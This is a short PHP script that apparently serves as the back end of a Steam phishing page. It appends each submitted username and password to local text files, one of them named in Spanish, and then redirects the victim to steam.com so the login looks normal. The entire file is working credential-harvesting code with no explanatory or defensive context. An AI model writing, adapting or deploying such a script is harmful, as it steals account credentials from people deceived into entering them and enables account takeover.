<?php

file_put_contents("usernames.txt", $_POST['username'], FILE_APPEND);
file_put_contents("contrasenas.txt", $_POST['password'], FILE_APPEND);
header('Location: https://steam.com');
exit();
?>